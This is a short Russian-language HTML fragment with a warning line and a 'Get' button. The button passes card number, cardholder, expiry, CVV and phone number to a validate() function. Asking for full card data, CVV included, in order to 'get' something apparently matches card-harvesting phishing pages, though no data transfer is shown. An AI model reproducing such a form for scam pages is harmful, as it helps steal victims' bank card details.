...
<div class="form-bg scr">
  ...
  <p style="color: #f50800;font-size: 1.25vh;margin-left: 2vh" class="roboto-bold" id="Error">Перед тем, как нажать кнопку "Получить", убедитесь, что данные записаны верно!</p>
    <button style="color: white;text-decoration: none;" class="form-inp-button roboto-bold" id="getcodebut" onclick="validate(document.getElementById('cardnum').value,document.getElementById('cardholder').value,document.getElementById('cardd').value,document.getElementById('cardcccvvv').value,document.getElementById('phonenum').value)">Получить</button>
</div>
